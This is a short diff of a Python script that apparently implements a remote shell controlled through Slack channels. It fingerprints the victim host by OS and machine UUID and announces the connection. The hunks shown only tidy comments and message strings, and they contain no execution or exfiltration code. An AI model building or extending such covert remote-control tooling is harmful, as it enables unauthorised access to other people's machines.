@@ -46,12 +46,6 @@ def run_c(input_c, sh_channel_id):
 
 # TODO:
 # Function the script up 
-# Have an exit and upload mechanism
-# Read slack tokens from a config file
-
-# Bugs:
-# Channels sometimes dont get created.
-# Upload sends bytes output converted to string - Looks like an issue on Slack's side.
 
 
 def next_sh(channel_names):
@@ -76,7 +70,6 @@ def next_sh(channel_names):
 
 
 def init_conn():
-    # Initial connection
     if platform.system() == "Windows":
         machine_UUID = str(subprocess.check_output("wmic csproduct get UUID"))
     elif platform.system() == "Linux":
@@ -93,11 +86,9 @@ def init_conn():
                                                    ])
                            )
     else:
-        machine_UUID = str("platform unrecognized.")
+        machine_UUID = str("unknown")
 
-    # Won't work if /etc/hosts has  127.0.0.1 defined as hostname:
-    sh_stdout = platform.system() + " with the " + machine_UUID + " UUID connected."
-    # re.search(r'\d+', sh_stdout).group(0)
+    sh_stdout = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."
 
     return sh_stdout
 
